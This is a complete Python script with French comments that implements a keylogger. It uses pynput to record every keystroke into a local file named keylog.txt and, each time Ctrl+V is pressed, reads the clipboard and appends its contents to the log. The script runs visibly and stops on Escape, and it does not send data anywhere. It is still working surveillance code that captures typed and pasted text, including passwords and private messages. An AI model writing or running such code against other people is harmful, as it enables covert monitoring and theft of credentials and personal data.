import os
import pyperclip  # Permet de lire le presse-papiers
from pynput import keyboard

# Fichier où seront enregistrées les frappes
fichier_journal = "keylog.txt"

# Ensemble pour suivre l'état des touches modificatrices
touches_enfoncees = set()
texte_en_memoire = ""

# Charger le texte existant s'il y en a un
if os.path.exists(fichier_journal):
    try:
        with open(fichier_journal, "r", encoding="utf-8") as f:
            texte_en_memoire = f.read()
    except Exception:
        texte_en_memoire = ""

def sauvegarder_fichier():
    """Écrit le texte mis à jour dans le fichier."""
    try:
        with open(fichier_journal, "w", encoding="utf-8") as f:
            f.write(texte_en_memoire)
    except IOError:
        pass

def enregistrer_touche(touche):
    global texte_en_memoire
    changement = False

    # Enregistrer la touche comme enfoncée
    touches_enfoncees.add(touche)

    # Vérifier si l'une des touches CTRL est enfoncée
    ctrl_actif = (keyboard.Key.ctrl_l in touches_enfoncees or 
                  keyboard.Key.ctrl_r in touches_enfoncees or 
                  keyboard.Key.ctrl in touches_enfoncees)

    # 1. GESTION DU CTRL + V (COLLAGE)
    # Pynput détecte parfois la lettre 'v' brute ou sous forme de code '\x16' avec Ctrl
    est_touche_v = False
    if hasattr(touche, 'char') and touche.char is not None:
        est_touche_v = (touche.char.lower() == 'v' or touche.char == '\x16')

    if ctrl_actif and est_touche_v:
        try:
            contenu_presse_papiers = pyperclip.paste()
            if contenu_presse_papiers:
                texte_en_memoire += contenu_presse_papiers
                changement = True
        except Exception:
            pass # Gère les cas où le presse-papiers contient une image au lieu de texte

    # 2. GESTION DU BACKSPACE (EFFACEMENT)
    elif touche == keyboard.Key.backspace:
        if len(texte_en_memoire) > 0:
            texte_en_memoire = texte_en_memoire[:-1]
            changement = True

    # 3. GESTION DES ESPACES ET SAUTS DE LIGNE
    elif touche == keyboard.Key.space:
        texte_en_memoire += " "
        changement = True
        
    elif touche == keyboard.Key.tab:
        texte_en_memoire += "    "
        changement = True
        
    elif touche == keyboard.Key.enter:
        texte_en_memoire += "\n"
        changement = True

    # 4. GESTION DES TOUCHES NORMALES (Seulement si CTRL n'est pas actif pour éviter les doublons)
    elif not isinstance(touche, keyboard.Key) and not ctrl_actif:
        if hasattr(touche, 'char') and touche.char is not None:
            texte_en_memoire += touche.char
            changement = True

    if changement:
        sauvegarder_fichier()

def relacher_touche(touche):
    # Retirer la touche de l'ensemble des touches enfoncées
    if touche in touches_enfoncees:
        touches_enfoncees.discard(touche)
        
    # Arrête le keylogger si la touche 'Echap' est pressée
    if touche == keyboard.Key.esc:
        print("\nEnregistrement terminé et fichier synchronisé.")
        return False

# Démarrage de l'écouteur du clavier
print("Enregistrement avec interception du presse-papiers... Appuyez sur Echap pour arrêter.")
with keyboard.Listener(on_press=enregistrer_touche, on_release=relacher_touche) as ecouteur:
    ecouteur.join()
